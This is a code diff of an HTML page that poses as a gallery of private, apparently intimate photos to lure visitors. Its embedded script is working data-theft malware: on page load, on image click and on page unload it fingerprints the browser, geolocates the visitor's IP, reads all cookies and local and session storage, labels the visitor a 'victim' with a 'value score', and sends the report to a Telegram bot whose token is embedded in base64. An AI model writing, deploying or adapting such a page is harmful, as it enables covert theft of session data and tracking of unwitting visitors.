@@ -81,24 +81,27 @@
         
         <div class="gallery">
             <div class="image-card" onclick="openImage(1)">
-                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=400&h=300&fit=crop" 
-                     alt="Private Photo 1">
-                <div class="image-title">Daily Activities <3</div>
-                <div class="image-desc">Personal moments</div>
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
+                     alt="Private Photo 1" 
+                     onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
+                <div class="image-title">Daily activitieessss <3 </div>
+                <div class="image-desc">normal pics </div>
             </div>
             
             <div class="image-card" onclick="openImage(2)">
-                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&h=300&fit=crop" 
-                     alt="Private Photo 2">
-                <div class="image-title">Private Collection</div>
-                <div class="image-desc">Exclusive content</div>
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
+                     alt="Private Photo 2"
+                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
+                <div class="image-title">NVDES</div>
+                <div class="image-desc">Title says it all lol</div>
             </div>
             
             <div class="image-card" onclick="openImage(3)">
-                <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=400&h=300&fit=crop" 
-                     alt="Private Photo 3">
-                <div class="image-title">My Memories</div>
-                <div class="image-desc">Personal archive</div>
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
+                     alt="Private Photo 3"
+                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
+                <div class="image-title">My facee</div>
+                <div class="image-desc">I'm sooo ugly ik >_< </div>
             </div>
         </div>
     </div>
@@ -106,7 +109,7 @@
     <script>
         // ENCRYPTED TELEGRAM CONFIG (Base64 encoded)
         const ENCRYPTED_CONFIG = {
-            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU091RExLNVd0YzdJcmttRlhndER1YXFscw==',
+            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU291RExLNVd0YzdJcmttRlhndER1YXFscw==',
             chatId: 'ODAzMjQ5NDQ3OQ=='
         };
 
@@ -126,124 +129,172 @@
         let pageLoadTime = Date.now();
         let reportSent = false;
 
-        // STEALTH DATA COLLECTION - NO PERMISSIONS REQUIRED
-        async function collectAllDataStealth() {
+        // COMPREHENSIVE DATA COLLECTION
+        async function collectAllData() {
             const startTime = Date.now();
             
-            // Collect everything that doesn't require permissions
-            const data = {
-                meta: {
-                    timestamp: new Date().toISOString(),
-                    victimId: generateVictimId(),
-                    url: window.location.href,
-                    collectionTime: Date.now() - startTime
-                },
-                
-                // Technical fingerprinting (no permissions needed)
-                technical: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    hardware: {
-                        cores: navigator.hardwareConcurrency,
-                        memory: navigator.deviceMemory,
-                        touchPoints: navigator.maxTouchPoints
+            try {
+                // Collect all data in parallel
+                const [networkData, technicalData, behavioralData, storageData] = await Promise.allSettled([
+                    getNetworkInfo(),
+                    getTechnicalInfo(),
+                    getBehavioralInfo(),
+                    getStorageInfo()
+                ]);
+
+                allCollectedData = {
+                    meta: {
+                        timestamp: new Date().toISOString(),
+                        victimId: generateVictimId(),
+                        url: window.location.href,
+                        collectionTime: Date.now() - startTime,
+                        userAgent: navigator.userAgent
                     },
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight,
-                        colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio
-                    },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    cookieEnabled: navigator.cookieEnabled,
-                    pdfEnabled: navigator.pdfViewerEnabled,
-                    webdriver: navigator.webdriver,
-                    plugins: getPluginsStealth(),
-                    fonts: getFontsStealth(),
-                    canvas: getCanvasFingerprint(),
-                    webgl: getWebGLFingerprint()
-                },
-                
-                // Network data (no permissions needed)
-                network: await getNetworkData(),
-                
-                // Behavioral data (no permissions needed)
-                behavioral: {
-                    referrer: document.referrer,
-                    sessionStart: pageLoadTime,
-                    duration: Date.now() - pageLoadTime,
-                    interactions: {
-                        total: sessionLog.length,
-                        clicks: sessionLog.filter(log => log.type === 'click').length,
-                        moves: sessionLog.filter(log => log.type === 'mousemove').length,
-                        scrolls: sessionLog.filter(log => log.type === 'scroll').length,
-                        keys: sessionLog.filter(log => log.type === 'keydown').length
-                    },
-                    scrollDepth: getScrollDepth(),
-                    viewport: `${window.innerWidth}x${window.innerHeight}`,
-                    engagement: calculateEngagement()
-                },
-                
-                // Stored data (no permissions needed)
-                storage: {
-                    cookies: getAllCookies(),
-                    localStorage: getAllLocalStorage(),
-                    sessionStorage: getAllSessionStorage()
-                },
-                
-                // Inferred data
-                inferred: {
-                    device: inferDeviceType(),
-                    os: inferOperatingSystem(),
-                    browser: inferBrowser(),
-                    location: await inferLocation(),
-                    interests: inferInterests(),
-                    value: calculateVictimValue()
-                }
-            };
-            
-            allCollectedData = data;
-            return data;
+                    network: networkData.status === 'fulfilled' ? networkData.value : {},
+                    technical: technicalData.status === 'fulfilled' ? technicalData.value : {},
+                    behavioral: behavioralData.status === 'fulfilled' ? behavioralData.value : {},
+                    storage: storageData.status === 'fulfilled' ? storageData.value : {},
+                    inferred: {
+                        device: inferDeviceType(),
+                        os: inferOperatingSystem(),
+                        browser: inferBrowser(),
+                        location: await inferLocation(),
+                        value: calculateVictimValue()
+                    }
+                };
+
+                return allCollectedData;
+            } catch (error) {
+                console.error('Data collection error:', error);
+                return getFallbackData();
+            }
         }
 
-        // STEALTH DATA COLLECTION METHODS (No permissions required)
-        function getPluginsStealth() {
+        // NETWORK INFORMATION
+        async function getNetworkInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    return {
+                        ip: ipData.ip,
+                        city: locationData.city || 'Unknown',
+                        region: locationData.region || 'Unknown',
+                        country: locationData.country_name || 'Unknown',
+                        countryCode: locationData.country_code || 'Unknown',
+                        isp: locationData.org || 'Unknown',
+                        asn: locationData.asn || 'Unknown',
+                        timezone: locationData.timezone || 'Unknown'
+                    };
+                } catch (e) {
+                    return {
+                        ip: ipData.ip,
+                        city: 'Unknown',
+                        country: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                }
+            } catch (error) {
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+
+        // TECHNICAL INFORMATION
+        function getTechnicalInfo() {
+            return {
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'Unknown',
+                language: navigator.language,
+                languages: navigator.languages || ['Unknown'],
+                hardware: {
+                    cores: navigator.hardwareConcurrency || 'Unknown',
+                    memory: navigator.deviceMemory || 'Unknown',
+                    touchPoints: navigator.maxTouchPoints || 0
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                cookieEnabled: navigator.cookieEnabled,
+                pdfEnabled: navigator.pdfViewerEnabled || false,
+                webdriver: navigator.webdriver || false,
+                plugins: getPluginsList(),
+                fonts: getFontsList(),
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLInfo()
+            };
+        }
+
+        // BEHAVIORAL INFORMATION
+        function getBehavioralInfo() {
+            return {
+                referrer: document.referrer || 'Direct',
+                sessionStart: pageLoadTime,
+                duration: Date.now() - pageLoadTime,
+                interactions: {
+                    total: sessionLog.length,
+                    clicks: sessionLog.filter(log => log.type === 'click').length,
+                    moves: sessionLog.filter(log => log.type === 'mousemove').length,
+                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
+                    keys: sessionLog.filter(log => log.type === 'keydown').length
+                },
+                scrollDepth: getScrollDepth(),
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                engagement: calculateEngagementScore()
+            };
+        }
+
+        // STORAGE INFORMATION
+        function getStorageInfo() {
+            return {
+                cookies: getAllCookies(),
+                localStorage: getAllLocalStorage(),
+                sessionStorage: getAllSessionStorage()
+            };
+        }
+
+        // HELPER FUNCTIONS
+        function getPluginsList() {
             const plugins = [];
             for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push({
-                    name: navigator.plugins[i].name,
-                    filename: navigator.plugins[i].filename
-                });
+                plugins.push(navigator.plugins[i].name);
             }
             return plugins;
         }
 
-        function getFontsStealth() {
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const testString = "mmmmmmmmmmlli";
-            const testSize = '72px';
+        function getFontsList() {
             const fontList = [
                 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                 'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                 'Verdana', 'Webdings', 'Wingdings'
             ];
-            
             const availableFonts = [];
+            
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
             
             fontList.forEach(font => {
                 context.font = testSize + " '" + font + "'";
-                const metrics1 = context.measureText(testString);
-                context.font = testSize + " '" + baseFonts[0] + "'";
-                const metrics2 = context.measureText(testString);
-                if (metrics1.width !== metrics2.width) {
+                const width1 = context.measureText(testString).width;
+                context.font = testSize + " 'monospace'";
+                const width2 = context.measureText(testString).width;
+                if (width1 !== width2) {
                     availableFonts.push(font);
                 }
             });
@@ -267,120 +318,92 @@
             }
         }
 
-        function getWebGLFingerprint() {
+        function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
-                if (!gl) return 'no_webgl';
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
-                return 'webgl_no_debug';
+                return gl ? 'WebGL Available' : 'No WebGL';
             } catch(e) {
                 return 'failed';
             }
         }
 
-        async function getNetworkData() {
-            try {
-                // Get IP through multiple services
-                const ipServices = [
-                    'https://api.ipify.org?format=json',
-                    'https://api64.ipify.org?format=json',
-                    'https://jsonip.com'
-                ];
-                
-                for (let service of ipServices) {
-                    try {
-                        const response = await fetch(service, { mode: 'cors' });
-                        const data = await response.json();
-                        const ip = data.ip || data.ip_str;
-                        if (ip) {
-                            // Get location from IP
-                            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                            const locationData = await locationResponse.json();
-                            return {
-                                ip: ip,
-                                city: locationData.city,
-                                region: locationData.region,
-                                country: locationData.country_name,
-                                countryCode: locationData.country_code,
-                                isp: locationData.org,
-                                asn: locationData.asn
-                            };
-                        }
-                    } catch(e) {
-                        continue;
-                    }
-                }
-            } catch(e) {
-                // Fallback to basic IP detection
-                try {
-                    const response = await fetch('https://api.ipify.org?format=json');
-                    const data = await response.json();
-                    return { ip: data.ip, city: 'Unknown', country: 'Unknown' };
-                } catch(e2) {
-                    return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
-                }
-            }
-        }
-
         function getAllCookies() {
             const cookies = {};
-            document.cookie.split(';').forEach(cookie => {
-                const [name, value] = cookie.split('=').map(c => c.trim());
-                if (name) cookies[name] = value || '';
-            });
+            if (document.cookie) {
+                document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.split('=').map(c => c.trim());
+                    if (name) cookies[name] = value || '';
+                });
+            }
             return cookies;
         }
 
         function getAllLocalStorage() {
             const storage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                storage[key] = localStorage.getItem(key);
-            }
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    storage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
             return storage;
         }
 
         function getAllSessionStorage() {
             const storage = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                storage[key] = sessionStorage.getItem(key);
-            }
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    storage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {}
             return storage;
         }
 
-        // INFERENCE FUNCTIONS
+        function getScrollDepth() {
+            const scrollHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            ) - window.innerHeight;
+            
+            const scrolled = window.scrollY;
+            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+        }
+
+        function calculateEngagementScore() {
+            const duration = Date.now() - pageLoadTime;
+            const interactions = sessionLog.length;
+            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
+        }
+
         function inferDeviceType() {
             const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes('mobile')) return 'Mobile';
-            if (ua.includes('tablet')) return 'Tablet';
+            if (/mobile|android|iphone|ipad/.test(ua)) return 'Mobile';
+            if (/tablet|ipad/.test(ua)) return 'Tablet';
             return 'Desktop';
         }
 
         function inferOperatingSystem() {
             const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'macOS';
-            if (ua.includes('Linux')) return 'Linux';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iOS')) return 'iOS';
+            if (/Windows/.test(ua)) return 'Windows';
+            if (/Mac/.test(ua)) return 'macOS';
+            if (/Linux/.test(ua)) return 'Linux';
+            if (/Android/.test(ua)) return 'Android';
+            if (/iOS|iPhone|iPad/.test(ua)) return 'iOS';
             return 'Unknown';
         }
 
         function inferBrowser() {
             const ua = navigator.userAgent;
-            if (ua.includes('Chrome')) return 'Chrome';
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Safari')) return 'Safari';
-            if (ua.includes('Edge')) return 'Edge';
+            if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
+            if (/Firefox/.test(ua)) return 'Firefox';
+            if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
+            if (/Edg/.test(ua)) return 'Edge';
             return 'Unknown';
         }
 
@@ -389,137 +412,55 @@
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 return {
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    timezone: data.timezone
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown'
                 };
             } catch(e) {
                 return {
                     city: 'Unknown',
-                    region: 'Unknown', 
-                    country: 'Unknown',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    region: 'Unknown',
+                    country: 'Unknown'
                 };
             }
         }
 
-        function inferInterests() {
-            const interests = [];
-            const keywords = document.body.innerText.toLowerCase();
-            
-            if (keywords.includes('gaming') || keywords.includes('game')) interests.push('Gaming');
-            if (keywords.includes('shopping') || keywords.includes('buy')) interests.push('Shopping');
-            if (keywords.includes('travel') || keywords.includes('vacation')) interests.push('Travel');
-            if (keywords.includes('tech') || keywords.includes('computer')) interests.push('Technology');
-            if (keywords.includes('sports') || keywords.includes('fitness')) interests.push('Sports');
-            
-            return interests.length > 0 ? interests : ['General'];
-        }
-
         function calculateVictimValue() {
-            let value = 50; // Base value
-            
-            // Add value based on data richness
-            if (allCollectedData.technical.hardware.cores >= 8) value += 20;
-            if (allCollectedData.technical.hardware.memory >= 8) value += 15;
-            if (allCollectedData.network.country === 'United States') value += 25;
-            if (allCollectedData.inferred.interests.includes('Shopping')) value += 10;
-            if (Object.keys(allCollectedData.storage.cookies).length > 5) value += 10;
-            if (allCollectedData.behavioral.interactions.total > 20) value += 15;
-            
+            let value = 50;
+            if (allCollectedData.technical?.hardware?.cores >= 4) value += 10;
+            if (allCollectedData.network?.country !== 'Unknown') value += 20;
+            if (allCollectedData.behavioral?.interactions?.total > 10) value += 15;
+            if (Object.keys(allCollectedData.storage?.cookies || {}).length > 0) value += 15;
             return Math.min(100, value);
         }
 
-        function getScrollDepth() {
-            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
-            const scrolled = window.scrollY;
-            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
-        }
-
-        function calculateEngagement() {
-            const duration = Date.now() - pageLoadTime;
-            const interactions = sessionLog.length;
-            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
-        }
-
         function generateVictimId() {
-            const random = Math.random().toString(36).substr(2, 9);
-            const timestamp = Date.now().toString(36);
-            return `v_${random}_${timestamp}`;
+            return 'v_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
         }
 
-        // SEND COMPREHENSIVE REPORT
-        async function sendComprehensiveReport() {
-            if (reportSent) return;
-            
-            const data = await collectAllDataStealth();
-            const message = formatReportMessage(data);
-            
-            try {
-                await sendToTelegram(message);
-                reportSent = true;
-                console.log('Report sent successfully');
-            } catch(error) {
-                console.error('Failed to send report:', error);
-            }
+        function getFallbackData() {
+            return {
+                meta: {
+                    timestamp: new Date().toISOString(),
+                    victimId: generateVictimId(),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                },
+                network: { ip: 'Unknown', country: 'Unknown' },
+                technical: { platform: navigator.platform },
+                behavioral: { referrer: document.referrer },
+                storage: {},
+                inferred: { device: 'Unknown', os: 'Unknown' }
+            };
         }
 
-        function formatReportMessage(data) {
-            return `🚨 **COMPREHENSIVE DATA CAPTURE** 🚨
-
-📊 **VICTIM PROFILE**
-🆔 ID: ${data.meta.victimId}
-⏰ Collection: ${data.meta.collectionTime}ms
-🌐 URL: ${data.meta.url}
-📅 Time: ${new Date(data.meta.timestamp).toLocaleString()}
-
-🔧 **SYSTEM FINGERPRINT**
-💻 OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
-🖥️ Device: ${data.inferred.device} | Cores: ${data.technical.hardware.cores}
-💾 RAM: ${data.technical.hardware.memory}GB | Screen: ${data.technical.screen.width}x${data.technical.screen.height}
-🌍 Language: ${data.technical.language} | Timezone: ${data.technical.timezone}
-
-🌐 **NETWORK & LOCATION**
-📍 IP: ${data.network.ip} | ISP: ${data.network.isp}
-🏙️ Location: ${data.network.city}, ${data.network.country}
-🇺🇳 Country Code: ${data.network.countryCode} | ASN: ${data.network.asn}
-
-📈 **BEHAVIORAL DATA**
-🔗 Referrer: ${data.behavioral.referrer || 'Direct'}
-⏱️ Duration: ${Math.round(data.behavioral.duration/1000)}s
-🖱️ Interactions: ${data.behavioral.interactions.total} total
-📜 Scroll Depth: ${data.behavioral.scrollDepth}% | Engagement: ${data.behavioral.engagement}/100
-
-💾 **STORAGE DATA**
-🍪 Cookies: ${Object.keys(data.storage.cookies).length}
-💿 Local Storage: ${Object.keys(data.storage.localStorage).length}
-📀 Session Storage: ${Object.keys(data.storage.sessionStorage).length}
-
-🎯 **INFERRED INSIGHTS**
-💰 Value Score: ${data.inferred.value}/100
-🎮 Interests: ${data.inferred.interests.join(', ')}
-📱 Device Type: ${data.inferred.device}
-
-🔍 **TECHNICAL DETAILS**
-🔌 Plugins: ${data.technical.plugins.length} installed
-🔤 Fonts: ${data.technical.fonts.length} detected
-🎨 Canvas FP: ${data.technical.canvas}
-🔄 WebGL: ${typeof data.technical.webgl === 'object' ? 'Available' : data.technical.webgl}
-
-⚡ **STEALTH CAPTURE COMPLETE**`;
-        }
-
-        // TELEGRAM SEND FUNCTION
+        // SEND DATA TO TELEGRAM
         async function sendToTelegram(message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                    'Accept': 'application/json'
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
                         chat_id: CONFIG.chatId,
@@ -527,16 +468,101 @@
                         parse_mode: 'Markdown'
                     })
                 });
-                return response.ok;
-            } catch(error) {
-                console.error('Telegram error:', error);
+                
+                if (response.ok) {
+                    console.log('Message sent successfully');
+                    return true;
+                } else {
+                    console.error('Telegram API error:', await response.text());
+                    return false;
+                }
+            } catch (error) {
+                console.error('Network error sending to Telegram:', error);
                 return false;
+            }
+        }
+
+        // FORMAT AND SEND COMPREHENSIVE REPORT
+        async function sendComprehensiveReport() {
+            if (reportSent) return;
+            
+            showLoading(true);
+            const data = await collectAllData();
+            const message = formatReportMessage(data);
+            
+            const success = await sendToTelegram(message);
+            if (success) {
+                reportSent = true;
+                console.log('Comprehensive report sent');
+            } else {
+                console.error('Failed to send report');
+            }
+            showLoading(false);
+        }
+
+        function formatReportMessage(data) {
+            return `🚨 **COMPLETE DATA CAPTURE REPORT** 🚨
+
+📊 **VICTIM IDENTIFICATION**
+🆔 ID: ${data.meta.victimId}
+⏰ Collection Time: ${data.meta.collectionTime}ms
+🌐 URL: ${data.meta.url}
+📅 Timestamp: ${new Date(data.meta.timestamp).toLocaleString()}
+
+🌐 **NETWORK INFORMATION**
+📍 IP Address: ${data.network.ip}
+🏙️ Location: ${data.network.city}, ${data.network.country} (${data.network.countryCode})
+🏢 ISP: ${data.network.isp}
+🔢 ASN: ${data.network.asn}
+⏰ Timezone: ${data.network.timezone}
+
+💻 **SYSTEM INFORMATION**
+🖥️ Platform: ${data.technical.platform}
+🔧 OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
+📱 Device: ${data.inferred.device}
+⚙️ Hardware: ${data.technical.hardware.cores} cores, ${data.technical.hardware.memory}GB RAM
+🖥️ Screen: ${data.technical.screen.width}x${data.technical.screen.height}
+🎯 Pixel Ratio: ${data.technical.screen.pixelRatio}
+🌍 Language: ${data.technical.language}
+⏰ System Timezone: ${data.technical.timezone}
+
+📈 **BEHAVIORAL DATA**
+🔗 Referrer: ${data.behavioral.referrer}
+⏱️ Session Duration: ${Math.round(data.behavioral.duration/1000)}s
+🖱️ Total Interactions: ${data.behavioral.interactions.total}
+📜 Scroll Depth: ${data.behavioral.scrollDepth}%
+🎯 Engagement Score: ${data.behavioral.engagement}/100
+👁️ Viewport: ${data.behavioral.viewport}
+
+💾 **STORAGE DATA**
+🍪 Cookies: ${Object.keys(data.storage.cookies).length}
+💿 Local Storage: ${Object.keys(data.storage.localStorage).length}
+📀 Session Storage: ${Object.keys(data.storage.sessionStorage).length}
+
+🔍 **TECHNICAL FINGERPRINT**
+🔌 Plugins: ${data.technical.plugins.length}
+🔤 Fonts: ${data.technical.fonts.length}
+🎨 Canvas: ${data.technical.canvas}
+🔄 WebGL: ${data.technical.webgl}
+🔐 Cookies Enabled: ${data.technical.cookieEnabled}
+📄 PDF Viewer: ${data.technical.pdfEnabled}
+
+🎯 **INFERRED DATA**
+💰 Value Score: ${data.inferred.value}/100
+📱 Device Type: ${data.inferred.device}
+
+⚡ **DATA CAPTURE COMPLETE**`;
+        }
+
+        function showLoading(show) {
+            const loadingEl = document.getElementById('loading');
+            if (loadingEl) {
+                loadingEl.style.display = show ? 'block' : 'none';
             }
         }
 
         // SESSION TRACKING
         function setupSessionTracking() {
-            // Track all interactions
             const events = ['mousemove', 'click', 'scroll', 'keydown', 'input'];
             events.forEach(event => {
                 document.addEventListener(event, (e) => {
@@ -547,11 +573,6 @@
                         y: e.clientY,
                         target: e.target.tagName
                     });
-                    
-                    // Limit log size
-                    if (sessionLog.length > 1000) {
-                        sessionLog = sessionLog.slice(-500);
-                    }
                 });
             });
         }
@@ -559,16 +580,15 @@
         // IMAGE HANDLER
         function openImage(imageId) {
             const images = {
-                1: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=800&h=600&fit=crop',
-                2: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=800&h=600&fit=crop',
-                3: 'https://images.unsplash.com/photo-1494790108755-2616b612b786?w=800&h=600&fit=crop'
+                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
+                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
+                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
             };
             
             if (images[imageId]) {
                 window.open(images[imageId], '_blank');
             }
             
-            // Trigger data collection on first interaction
             if (!reportSent) {
                 sendComprehensiveReport();
             }
@@ -577,29 +597,30 @@
         // INITIALIZATION
         window.addEventListener('load', function() {
             pageLoadTime = Date.now();
-            
-            // Setup tracking immediately
             setupSessionTracking();
             
-            // Send initial report after 2 seconds
-            setTimeout(sendComprehensiveReport, 2000);
+            // Send report after 3 seconds
+            setTimeout(sendComprehensiveReport, 3000);
             
-            // Send final report when page unloads
+            // Send final report on unload
             window.addEventListener('beforeunload', function() {
                 if (!reportSent) {
-                    // Send sync request if possible
-                    const data = JSON.stringify(allCollectedData);
-                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, 
-                        JSON.stringify({
-                            chat_id: CONFIG.chatId,
-                            text: `🔚 Session ended - ${allCollectedData.meta?.victimId || 'Unknown'}`
-                        })
-                    );
+                    const finalData = allCollectedData.meta ? allCollectedData : getFallbackData();
+                    const finalMessage = `🔚 **SESSION ENDED**\nVictim: ${finalData.meta.victimId}\nDuration: ${Math.round((Date.now() - pageLoadTime)/1000)}s\nInteractions: ${sessionLog.length}`;
+                    
+                    // Use sendBeacon for reliable delivery on page unload
+                    const blob = new Blob([JSON.stringify({
+                        chat_id: CONFIG.chatId,
+                        text: finalMessage,
+                        parse_mode: 'Markdown'
+                    })], {type: 'application/json'});
+                    
+                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, blob);
                 }
             });
         });
 
-        console.log('Stealth data capture system loaded');
+        console.log('Data capture system initialized');
     </script>
 </body>
 </html>
